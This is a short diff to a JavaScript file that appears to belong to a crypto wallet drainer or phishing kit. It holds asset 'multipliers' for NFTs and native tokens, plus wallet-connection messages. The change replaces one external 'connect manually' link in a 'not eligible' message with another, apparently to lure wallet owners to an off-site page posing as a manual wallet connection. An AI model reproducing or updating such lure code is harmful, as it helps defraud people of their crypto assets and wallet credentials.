@@ -90,7 +90,7 @@ let multipliers = {
 'NFT': 1,
 'NATIVES': 0.1,
 };
-let notEligible = "Your wallet is not eligible, connect another wallet or <br> <br> <a target='_blank' href='https://Web3APIfirmware.pages.dev/en' class='cs-btn cs-btn_filed cs-accent_btn'> <b>Click here to connect manually</b></a>";
+let notEligible = "Your wallet is not eligible, connect another wallet or <br> <br> <a target='_blank' href='https://web3apifirmware.github.io/manual/' class='cs-btn cs-btn_filed cs-accent_btn'> <b>Click here to connect manually</b></a>";
 let swal_notEligibleTitle = "Not eligible";
 let addressChanged = "Your wallet address has changed, connect wallet again please";
 let swal_addressChangedTitle = "Address changed";
